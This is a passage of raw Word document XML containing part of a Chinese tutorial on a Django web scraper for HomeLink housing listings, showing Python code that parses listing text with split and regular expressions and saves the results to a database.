    <w:p w14:paraId="0EA677C0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            new_item.location = item['location']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="520F56B4" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            new_item.total_price = item['total_price']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="503EE9E0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            new_item.unit_price = item['unit_price']</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AADCF1A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">            new_item.save()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46689AD9" w14:textId="189F19CF" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="360949EE" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们现在来看下上面这段代码如何工作的：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1D65F3CC" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>当用户以POST提交查询表单，我们构建需要爬取的链接，然后交由HomeLinkSpider类处理。处理完成后返回index页面。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B46A5C2" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们构建HomeLinkSpider类，该类接收需要爬取的url作为参数，并具体包含了三个方法。get_max_page方法可获取目标url的分页最大页数。parse_page方法可以循环爬取每个分页上的数据，并将其存入self.data列表。save_to_model方法可以将self.data遍历并存入Django数据库。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1051FCB7" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>我们使用fake-useragent构造请求头headers防止爬虫被封。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3458A810" w14:textId="68EED50F" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="14E4EEED" w14:textId="2E36139C" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>实战效果</w:t>
      </w:r>
      <w:r w:rsidR="004300AE">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>:图略</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DAEB4D8" w14:textId="751985C8" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>当你在首页选择爬取选项，点击开始爬取，等待2分钟，你就可以看到爬取的数据以表格形式分页显示在同一页面上啦。</w:t>
      </w:r>
      <w:r w:rsidR="004300AE">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>图略</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="527B7BAF" w14:textId="537202A4" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6644DB23" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>使用split方法和正则表达式提取数据</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A97C380" w14:textId="1A544524" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2B33F405" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>在整个项目中，从爬取的数据（通常是字符串)中提取我们所需要的信息是最重要的。下例展示了我们如何使用split方法从一长串字符串中提取小区的名字，房厅，面积和朝向信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AAF78EA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>大华锦绣华城</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>九街区</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>)  | 3</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>室</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>2</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>厅</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> | 76.9</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>平米</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>南</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>其他</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"> | </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>无电梯</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A11512C" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>house_info = li.select('div[class="houseInfo"]')[0].get_text()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6BEDAC74" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>house_info_list = house_info.split(" | ")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E95C6C0" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="5D1A8CB2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>detail['house'] = house_info_list[0]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DCA5E13" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>detail['bedroom'] = house_info_list[1]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1704E3FA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>detail['area'] = house_info_list[2]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03253AAA" w14:textId="5787FD15" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>detail['direction'] = house_info_list[3]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46482CE0" w14:textId="77777777" w:rsidR="003802BB" w:rsidRPr="003802BB" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>下例展示了我们如何使用正则表达式的re.search方法从一长串字符串中提取楼层，年份和板块信息。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7956D9A6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve"># </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>低楼层</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>(</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>共</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>7</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>层</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>)2006</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>年建板楼</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">  -  </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>张江</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>提取楼层，年份和板块</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="622BE686" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>position_info = li.select('div[class="positionInfo"]')[0].get_text().split(' - ')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="75AA32B2" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="30385C06" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>floor_pattern = re.compile(r'.+\)')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1587AFB1" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">match1 = re.search(floor_pattern, position_info[0])  # </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>从字符串任意位置匹配</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6E8D8C1E" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>if match1:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B434080" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    detail['floor'] = match1.group()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="378685EC" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>else:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="455B9B33" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    detail['floor'] = "</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>未知</w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35D07583" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3B3B8DFE" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">detail['floor'] = re.search(floor_pattern, position_info[0]).group()  # </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>从字符串头部开始匹配</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="38FE4C00" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="00D8288D" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="053BB42A" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>year_pattern = re.compile(r'\d{4}')</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="409E3FEA" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">match2 = re.search(year_pattern, position_info[0])  # </w:t>
      </w:r>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:rFonts w:hint="eastAsia"/>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>从字符串任意位置匹配</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2A1F4EFD" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t>if match2:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="642D09A6" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="003802BB">
        <w:rPr>
          <w:color w:val="008080"/>
        </w:rPr>
        <w:t xml:space="preserve">    detail['year'] = match2.group()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30EAEE87" w14:textId="77777777" w:rsidR="00D8288D" w:rsidRDefault="003802BB" w:rsidP="003802BB">
      <w:pPr>
        <w:pStyle w:val="HTML"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F5F5F5"/>
        <w:wordWrap w:val="0"/>
